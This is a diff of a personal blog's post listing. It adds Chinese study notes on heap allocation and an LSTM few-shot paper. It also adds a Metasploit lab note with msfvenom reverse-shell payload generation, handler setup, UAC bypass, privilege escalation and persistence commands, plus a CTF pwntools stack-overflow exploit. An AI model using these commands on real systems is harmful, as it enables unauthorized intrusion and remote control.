@@ -156,6 +156,389 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/heap01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/heap01/" class="post-title-link" itemprop="url">堆</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-12-06 19:19:49 / Modified: 19:22:33" itemprop="dateCreated datePublished" datetime="2023-12-06T19:19:49+08:00">2023-12-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>1.<a href="../Notes/Linkers&amp;Loaders02/">各种段的作用</a></p>
+<p>ELF .plt:库函数插桩所在；</p>
+<p>ELF .got:输入符号指针</p>
+<p>.bss：<strong>未初始化</strong> 数据；</p>
+<h3 id="2-mmap缺点"><a href="#2-mmap缺点" class="headerlink" title="2.mmap缺点"></a>2.mmap缺点</h3><ul>
+<li>1.分配字节数必须是4096字节的倍数，只能以内存页为单元管理内存，经过内核很慢。 </li>
+</ul>
+<p>3.按需分配内存，</p>
+<ul>
+<li><p>dllmaloc，Doug Lea开发并发布到公共社区；</p>
+</li>
+<li><p>Linux的glibc里的<strong>ptmalloc</strong>(Posix Thred aware fork of dllmalloc),</p>
+<p>malloc的多线程实现</p>
+</li>
+<li><p>FreeBSD里的jemalloc(被用在Firefox,Android)</p>
+</li>
+<li><p>Windows里的Segment heap,NT heap</p>
+</li>
+<li><p>kmalloc(linux内核内存分配器)，kalloc(ios内存分配器)</p>
+</li>
+</ul>
+<p>有动态分配器管理的内存—&gt;堆。</p>
+<p>C++程序，函数scanf、printf都要使用堆。</p>
+<h3 id="4-ptmalloc-glibc提供的对堆的管理函数"><a href="#4-ptmalloc-glibc提供的对堆的管理函数" class="headerlink" title="4.ptmalloc/glibc提供的对堆的管理函数"></a>4.ptmalloc/glibc提供的对堆的管理函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc() 分配内存</span><br><span class="line">free() 释放之前申请的内存块</span><br><span class="line">realloc() 分配后改变分配的尺寸</span><br><span class="line">calloc()分配并把内存清零</span><br></pre></td></tr></table></figure>
+<p>为什么要有calloc？因为未初始化的数据可能导致data disclosure。</p>
+<h3 id="5-现代化的技术"><a href="#5-现代化的技术" class="headerlink" title="5.现代化的技术"></a>5.现代化的技术</h3><p>ASLR(Adress Space Layout Randomlization, 地址空间布局随机化)</p>
+<p>NX</p>
+<p>PIE</p>
+<p>RELRO</p>
+<p>Stack Canary</p>
+<h3 id="6-Data-Segment"><a href="#6-Data-Segment" class="headerlink" title="6.Data Segment"></a>6.Data Segment</h3><ul>
+<li><p>ptmalloc在分配小内存时不使用mmap，用另一种内存管理方法brk() ；在大片分配时使用mmap；</p>
+</li>
+<li><p>一开始从零开始</p>
+</li>
+<li>由系统调用<code>brk</code>和<code>sbrk</code>管理，或许这两个 系统调用不再遵循POSIX标准。<ul>
+<li>sbrk(NULL) return 数据段的当前末尾</li>
+<li>sbrk(num)  扩充当前数据段num个字节</li>
+<li>brk(addr ) 扩充当前数据段一直到addr位置</li>
+</ul>
+</li>
+</ul>
+<p>写一段测试代码，捕捉malloc的场景，不要使用printf和puts，因为其内部可能会使用malloc；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> msg[]=<span class="string">&quot;Start malloc()!&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">        write(<span class="number">1</span>,msg,<span class="built_in">strlen</span>(msg));</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="7-为什么堆带来了危险？"><a href="#7-为什么堆带来了危险？" class="headerlink" title="7.为什么堆带来了危险？"></a>7.为什么堆带来了危险？</h3><p>程序员：</p>
+<p>忘记释放内存？</p>
+<p>忘记指针所指；</p>
+<p>忘记已经释放的内存有哪些；</p>
+<p>堆管理器：追求性能，安全之后再考虑。</p>
+<h3 id="8-一些检测和防御手段"><a href="#8-一些检测和防御手段" class="headerlink" title="8.一些检测和防御手段"></a>8.一些检测和防御手段</h3><p>Valgrind使用测试样例找到一些通常 错误，比如忘记释放内存，资源耗尽；</p>
+<p>glibc的严格模式：  会让程序变慢</p>
+<ul>
+<li>export MALLOC_CHECK=1</li>
+<li>export MALLOC_PERTURB=1</li>
+<li>export MALLOC_MMAP_THRESHOLD=1 #所有内存分配都通过，仍旧可以绕过</li>
+</ul>
+<h2 id="0x02-Dynamic-Allocator-Misuse"><a href="#0x02-Dynamic-Allocator-Misuse" class="headerlink" title="0x02 Dynamic Allocator Misuse"></a>0x02 Dynamic Allocator Misuse</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1zW4y1f7cB">https://www.bilibili.com/video/BV1zW4y1f7cB</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot21/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/Few-Shot21/" class="post-title-link" itemprop="url">Are LSTMs Good Few-Shot Learners?</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-11-30 16:13:22" itemprop="dateCreated datePublished" datetime="2023-11-30T16:13:22+08:00">2023-11-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-04 19:35:32" itemprop="dateModified" datetime="2023-12-04T19:35:32+08:00">2023-12-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>看论文，C刊及以下的一般不看介绍和相关工作部分，只看一眼本文贡献。</p>
+</blockquote>
+<p>面对一项新任务时，LSTM的权重是固定的。</p>
+<p>1.支持集的隐藏嵌入层并不是排列不变的。—&gt;通过对训练样本的平均池化</p>
+<p>2.学习算法和输入嵌入机制交错，带来优化挑战和增加过拟合风险—&gt;解耦</p>
+<h2 id="LSTM"><a href="#LSTM" class="headerlink" title="LSTM"></a>LSTM</h2><p>只是获取给定任务的训练数据，并根据生成的隐藏状态来调整新查询输入的预测。把支持集当作序列而非集合</p>
+<p>LSTM’s predictions for unseen inputs (queries) are conditioned on the hidden state h_M and cell state c_M .</p>
+<ul>
+<li>Should make the hidden embedding be invariant to the order in which the examples are fed into the LSTM.</li>
+</ul>
+<h2 id="Outer-Product-LSTM"><a href="#Outer-Product-LSTM" class="headerlink" title="Outer Product LSTM"></a>Outer Product LSTM</h2><p><img src="/categories/ML/Few-Shot21/1701685370310.png" alt="1701685370310"></p>
+<p>通过加上生成的隐状态和前一层输出的外积来更新当前隐藏矩阵。</p>
+<p>adjusting the weights of the LSTM using backpropagation across different tasks</p>
+<p>does not update the biases</p>
+<p>base-learner ：</p>
+<ul>
+<li><p>Use an LSTM to learn the weight update rule </p>
+</li>
+<li><p>good initialization parameters </p>
+</li>
+</ul>
+<h2 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h2><p>与四种方法作对比：MAML、prototypical network、SAP、Warp-MAML；</p>
+<p>在两类问题：few-shot sine wave regression、image classification benchmarks</p>
+<p>分类是在三个数据集上：</p>
+<ul>
+<li>Omniglot</li>
+<li>miniImageNet</li>
+<li>CUB</li>
+</ul>
+<p>within-domain few-shot image classification</p>
+<h2 id="实验部分设计"><a href="#实验部分设计" class="headerlink" title="实验部分设计"></a>实验部分设计</h2><p><strong>实验的随机种子，会影响初始化权重值，以及训练、测试、验证任务集。</strong></p>
+<p>2.测量更新方向之间的余弦相似度作为反距离度量，余弦相似度可以更好地衡量方向相似度，因为它从向量的大小中抽象出来。</p>
+<p>3.用-表示在限制的资源下，实验并没有运行完成。</p>
+<p>4.使用足够大隐藏维度的 LSTM 可以通过使用隐藏表示的前 N 个维度来执行学习并为下一个时间步<strong>保留重要信息</strong>，并使用剩余维度来表示输入表示，从而将学习与输入表示分开。</p>
+<h3 id="Cross-domain"><a href="#Cross-domain" class="headerlink" title="Cross-domain"></a>Cross-domain</h3><p>拿两个数据集，在一个数据集上训练，在另一个数据集上校验，但是要保证两个数据集没有交叉？？？</p>
+<p>Frobenius norm</p>
+<h2 id="一些吹嘘"><a href="#一些吹嘘" class="headerlink" title="一些吹嘘"></a>一些吹嘘</h2><p>作者一直在说OP-LSTM与其他方法正交，可以和其他方法同时使用，但是把它们留在了未来工作。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-11-28 19:58:47 / Modified: 21:30:04" itemprop="dateCreated datePublished" datetime="2023-11-28T19:58:47+08:00">2023-11-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\22154&gt;netstat -ano|findstr 11300</span><br><span class="line">  TCP    172.30.48.1:53633      172.30.56.107:11300    ESTABLISHED     21716</span><br><span class="line">  TCP    172.30.48.1:53699      172.30.56.107:11300    ESTABLISHED     5212</span><br><span class="line">  TCP    172.30.48.1:53704      172.30.56.107:11300    ESTABLISHED     17876</span><br></pre></td></tr></table></figure>
+<p><img src="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/1701172793037.png" alt="1701172793037"></p>
+<p>[<em>] UAC is Enabled, checking level…<br>[+] Part of Administrators group! Continuing…<br>[!] UAC set to DoNotPrompt - using ShellExecute “runas” method instead<br>[</em>] Uploading kFJOgrXchF.exe - 7168 bytes to the filesystem…</p>
+<p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp lhost=172.30.56.107 lport=11300 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</p>
+<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp #设置成payload的模式<br>set LHOST 172.30.56.107<br>set lport 11300<br>exploit -j<br>sessions -i 2<br>shell</p>
+<h1 id="进行进程迁移"><a href="#进行进程迁移" class="headerlink" title="进行进程迁移"></a>进行进程迁移</h1><p>tasklist|findstr explorer<br>migrate 1844<br>background<br>chcp 65001</p>
+<h1 id="探测系统漏洞，比较耗费系统资源"><a href="#探测系统漏洞，比较耗费系统资源" class="headerlink" title="探测系统漏洞，比较耗费系统资源"></a>探测系统漏洞，比较耗费系统资源</h1><p>use post/multi/recon/local_exploit_suggester<br>set session 1<br>exploit </p>
+<p>use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</p>
+<p>use exploit/windows/local/bypassuac_fodhelper</p>
+<p>set session 3</p>
+<p>exploit </p>
+<h2 id="上传到了临时文件夹"><a href="#上传到了临时文件夹" class="headerlink" title="上传到了临时文件夹"></a>上传到了临时文件夹</h2><p>检测发现后面上传的利用工具都</p>
+<p>C:\Users\22154\AppData\Local\Temp\OkNyUvljPBU.ps1<br>C:\Users\22154\AppData\Local\Temp\AFYMdwEU.ps1<br>VFvBBvAw.exe</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/local/bypassuac_dotnet_profiler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.30.56.107:11300</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[!] UAC set to DoNotPrompt - using ShellExecute &quot;runas&quot; method instead</span><br><span class="line">[*] Uploading XyrFnIA.exe - 7168 bytes to the filesystem...</span><br><span class="line">[*] Executing Command!</span><br><span class="line">[*] Sending stage (200774 bytes) to 172.30.48.1</span><br><span class="line">[*] Meterpreter session 5 opened (172.30.56.107:11300 -&gt; 172.30.48.1:54093) at 2023-11-28 20:15:41 +0800</span><br></pre></td></tr></table></figure>
+<h2 id="维持"><a href="#维持" class="headerlink" title="维持"></a>维持</h2><p>run persistence 借助vbs</p>
+<p><img src="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/1701177877128.png" alt="1701177877128"></p>
+<h2 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h2><h4 id="关闭“启用粘滞键”选项"><a href="#关闭“启用粘滞键”选项" class="headerlink" title="关闭“启用粘滞键”选项"></a>关闭“启用粘滞键”选项</h4><p>辅助功能—&gt;键盘，全部取消。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/xsbAWDP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/xsbAWDP/" class="post-title-link" itemprop="url">XSB2023 Py</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-11-19 14:19:49 / Modified: 16:25:05" itemprop="dateCreated datePublished" datetime="2023-11-19T14:19:49+08:00">2023-11-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>我的EXP</p>
+<p>我也找对了漏洞所在，是打赢BOSS2后留名字的栈溢出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;47.94.85.181&quot;,22872) #连接指定IP及端口，题目给定</span><br><span class="line">r.recvlines(10)       #运行到字符串位置停下</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">    r.sendline(&quot;2&quot;)       #运行到字符串位置停下</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvlines(7)   </span><br><span class="line">r.sendline(&quot;2&quot;)       #运行到字符串位置停下</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(&quot;2&quot;)</span><br><span class="line">r.recvlines(7)   </span><br><span class="line">payload = &#x27;A&#x27; * 9 + str(p64(0x00117630))#+str(p64(&#x27;flag&#x27;))+str(0x0000000000000001)+str(0x0000000000000001)#发送数据，输入数据溢出,并覆盖,返回到目标位置</span><br><span class="line">r.sendline(payload)         #发送 payload</span><br><span class="line">r.interactive()             #交互</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot20/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -179,10 +562,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-11-17 16:13:22 / Modified: 17:17:59" itemprop="dateCreated datePublished" datetime="2023-11-17T16:13:22+08:00">2023-11-17</time>
+              <time title="Created: 2023-11-17 16:13:22" itemprop="dateCreated datePublished" datetime="2023-11-17T16:13:22+08:00">2023-11-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-11-28 18:42:01" itemprop="dateModified" datetime="2023-11-28T18:42:01+08:00">2023-11-28</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -207,14 +596,22 @@
           <blockquote>
 <p>Ilia Sucholutsky, Matthias Schonlau,‘Less Than One’-Shot Learning: Learning N Classes From M&lt;N Samples, In AAAI 2021 Proceedings .</p>
 </blockquote>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>本文提出了一种在LO背景下的数据集压缩和原型生成技术。</p>
-<p>借助软标签，k近邻分类器来生成软标签    </p>
-<h2 id="工作和发现"><a href="#工作和发现" class="headerlink" title="工作和发现"></a>工作和发现</h2><p>分析这些决策景观，得出使用 M &lt; N 软标签样本分离 N 个类别的理论下限，并研究所得系统的稳健性。</p>
+<h2 id="Inspiration"><a href="#Inspiration" class="headerlink" title="Inspiration"></a>Inspiration</h2><p>软标签比硬标签携带更多信息，可以适用于LO场景。</p>
+<p>​    - 软标签可以标注样本间的共同特征，进而以这种方式增加信息密度和维度  </p>
+<p>​    - <strong>目标：</strong>训练样本足够少的情况下，模型还能够以足够的精度识别尽可能多的类别  </p>
+<h2 id="Terms"><a href="#Terms" class="headerlink" title="Terms"></a>Terms</h2><p>prototypes: soft-labelled synthetic images</p>
+<p>unrestricted soft label:各个元素可以是任何值，包括负数。</p>
+<p>soft\probabilistic  label：一个样本在各个类上的概率分布，各个类上的概率之和为1，可以使用softmax函数得到。</p>
+<p>hard label:在soft label上使用argmax得到。</p>
+<p>soft-label prototype (SLaP)：(X,Y)，特征向量和它对应的软标签。</p>
+<h2 id="Corollary"><a href="#Corollary" class="headerlink" title="Corollary"></a>Corollary</h2><p>推论</p>
+<h2 id="Work-amp-Finding"><a href="#Work-amp-Finding" class="headerlink" title="Work&amp; Finding"></a>Work&amp; Finding</h2><p>hard label prototype Distance-weighted kNN is the special case of SLaPkNN(基于距离度量的软标签原型KNN)</p>
+<p>分析这些决策景观，得出使用 M &lt; N 软标签样本分离 N 个类别的理论下限，并研究所得系统的稳健性。</p>
 <p>1.分析创建的决策边界鲁棒性和稳定性的方法；</p>
 <p>2.软标签表征 训练集用于区分，比起硬标签使用的原型更少。理想情况，是O(N^2)降低到O(1)。</p>
-<h2 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h2><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="一种有趣的提法"><a href="#一种有趣的提法" class="headerlink" title="一种有趣的提法"></a>一种有趣的提法</h3><p>通过描述，我们可以用犀牛 、马两类样本获得除犀牛、马以外 的独角兽的分类。</p>
+<h2 id><a href="#" class="headerlink" title=" "></a> </h2><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="一种有趣的提法"><a href="#一种有趣的提法" class="headerlink" title="一种有趣的提法"></a>一种有趣的提法</h3><p>通过描述，我们可以用犀牛 、马两类样本获得除犀牛、马以外 的独角兽的分类。</p>
 <p>FSL让模型更加样本有效。</p>
-<h2 id="分析的过去工作"><a href="#分析的过去工作" class="headerlink" title="分析的过去工作"></a>分析的过去工作</h2><h3 id="都在想办法对数据集进行蒸馏，"><a href="#都在想办法对数据集进行蒸馏，" class="headerlink" title="都在想办法对数据集进行蒸馏，"></a>都在想办法对数据集进行蒸馏，</h3><p>1.2019，软标签数据集蒸馏</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><h3 id="都在想办法对数据集进行蒸馏，"><a href="#都在想办法对数据集进行蒸馏，" class="headerlink" title="都在想办法对数据集进行蒸馏，"></a>都在想办法对数据集进行蒸馏，</h3><p>1.2019，软标签数据集蒸馏</p>
 <p>Sucholutsky, I.; and Schonlau, M. 2019. Soft-Label Dataset Distillation and Text Dataset Distillation. arXiv preprint arXiv:1910.02551 .</p>
 <p>2.2006，动态数据冻结</p>
 <p>Ruta, D. 2006. Dynamic data condensation for classification. In International Conference on Artificial Intelligence and Soft Computing, 672–681. Springer.</p>
@@ -640,361 +1037,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/ycb01/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/ycb01/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-10-09 17:48:02" itemprop="dateCreated datePublished" datetime="2023-10-09T17:48:02+08:00">2023-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-09-02 11:47:12" itemprop="dateModified" datetime="2023-09-02T11:47:12+08:00">2023-09-02</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v9 = *(_QWORD *)__stack_chk_guard_ptr;<span class="comment">//防止堆栈溢出</span></span><br><span class="line">  <span class="comment">//告诉系统，阻止调试器依附</span></span><br><span class="line">result = ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>);<span class="comment">//利用ptrace反调试</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="ARM64调用约定"><a href="#ARM64调用约定" class="headerlink" title="ARM64调用约定"></a>ARM64调用约定</h2><p>在ARM 64位体系结构中，函数参数通常会存储在一组特定的寄存器中，这些寄存器包括：</p>
-<ul>
-<li>参数0（x0）：用于存储第一个函数参数。</li>
-<li>参数1（x1）：用于存储第二个函数参数。</li>
-<li>参数2（x2）：用于存储第三个函数参数。</li>
-<li>参数3（x3）：用于存储第四个函数参数。</li>
-<li>参数4-7（x4-x7）：用于存储额外的函数参数。</li>
-</ul>
-<p>所以，根据ARM 64位体系结构的调用约定，参数应该存储在这些寄存器中，而不是ECX和EDX。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">48</span>h] v9   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">50</span>h]       | (<span class="number">8</span> 字节间隔)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">38</span>h] v8   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">40</span>h]       | (<span class="number">8</span> 字节间隔)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">28</span>h] v7   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">30</span>h]       | (<span class="number">8</span> 字节间隔)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">18</span>h] v6   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">20</span>h]       | (<span class="number">8</span> 字节间隔)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">8</span>h] v5   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| ... (下面的栈帧内容) |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
